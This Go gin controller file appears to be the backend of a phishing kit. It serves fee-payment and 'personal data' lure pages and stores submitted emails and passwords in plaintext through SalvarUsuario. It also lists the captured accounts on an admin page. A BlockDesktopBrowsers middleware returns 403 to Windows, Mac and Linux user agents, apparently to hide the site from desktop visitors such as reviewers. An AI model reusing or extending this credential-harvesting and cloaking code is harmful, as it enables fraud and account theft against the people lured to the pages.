package controllers

import (
	"fmt"
	"log"
	"net/http"
	"strings"
	"strconv"
	"github.com/gin-gonic/gin"

	"main/db"
)

func AdminIndex(c *gin.Context) {
	// Users
	usuarios, err := db.New().GetDados()
	if err != nil {
		log.Println("Erro ao obter usuário", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Erro ao obter usuários"})
		return
	}
	// Renderizar a página de admin
	c.HTML(http.StatusOK, "admin.html", gin.H{"usuarios": usuarios})
}

func Index(c *gin.Context) {
	c.HTML(http.StatusOK, "index.html", nil)
}

func Tax(c *gin.Context) {
	c.HTML(http.StatusOK, "taxa.html", nil)
}

func Important(c *gin.Context) {
	c.HTML(http.StatusOK, "importante.html", nil)
}

func Info(c *gin.Context) {
	c.HTML(http.StatusOK, "dados.html", nil)
}

func Payment(c *gin.Context) {
	c.HTML(http.StatusOK, "pagamento-taxa.html", nil)
}

func Inicial(c *gin.Context) {
	c.HTML(http.StatusOK, "inicial.html", nil)
}

func UsuarioShow(c *gin.Context) {
	// Obter o ID do usuário da URL
	id := c.Param("id")

	// Converter o ID para int
	idInt, err := strconv.Atoi(id)
	if err != nil {
		log.Println("Erro ao converter ID:", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Erro ao converter ID"})
		return
	}

	// Buscar o usuário no banco de dados
	usuario, err := db.New().GetUsuario(idInt)
	if err != nil {
		log.Println("Erro ao obter usuário:", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Erro ao obter usuário"})
		return
	}

	// Renderizar a página de usuário
	c.HTML(http.StatusOK, "admin.html", gin.H{"usuario": usuario})
}

func BlockDesktopBrowsers(c *gin.Context) {
	fmt.Println("Middleware chamado")
	userAgent := c.Request.UserAgent()
	if userAgent != "" {
		fmt.Println(userAgent)
	} else {
		fmt.Println("User -Agent não está presente ou está vazio")
	}
	if strings.Contains(userAgent, "Windows NT") || strings.Contains(userAgent, "Macintosh") || strings.Contains(userAgent, "Linux") || strings.Contains(userAgent, "X11") {
		c.AbortWithStatus(403)
		return
	}
	c.Next()
}

func SalvarUsuario(c *gin.Context) {
    // Obter valores do formulário
    email := c.Request.FormValue("email")
    senha := c.Request.FormValue("senha")

    // Salvar o e-mail e a senha no banco de dados
    err := db.New().SalvarUsuarioComDados(email, senha, "", "", "", "", "", "")
    if err != nil {
        c.JSON(http.StatusInternalServerError, gin.H{"error": "Erro ao salvar o e-mail e a senha"})
        return
    }

    // Retornar resposta
    c.JSON(http.StatusOK, gin.H{"message": "E-mail e senha salvos com sucesso"})
}